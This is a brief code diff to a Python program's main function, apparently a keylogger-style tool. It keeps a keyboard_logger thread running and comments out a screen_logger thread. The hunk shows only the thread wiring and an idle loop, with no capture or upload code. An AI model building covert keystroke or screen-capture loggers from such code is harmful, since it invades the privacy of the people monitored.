@@ -58,10 +58,10 @@ def main():
 
     # thread
     th1 = threading.Thread(target=keyboard_logger, daemon=True)
-    th2 = threading.Thread(target=screen_logger, daemon=True)
+    # th2 = threading.Thread(target=screen_logger, daemon=True)
 
     th1.start()
-    th2.start()
+    # th2.start()
 
     while True:
         pass
